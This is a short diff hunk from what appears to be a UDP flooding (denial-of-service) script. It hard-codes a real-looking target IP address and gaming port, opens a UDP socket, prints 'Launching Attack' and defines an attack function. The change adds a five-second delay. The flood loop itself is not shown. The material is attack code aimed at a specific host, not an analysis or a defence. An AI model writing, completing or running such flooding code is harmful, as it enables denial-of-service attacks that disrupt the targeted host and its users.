@@ -12,7 +12,7 @@ ip = '98.155.64.207'
 port = 3074
 
 sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-
+time.sleep(5)
 print("Launching Attack")
 
 def attack():
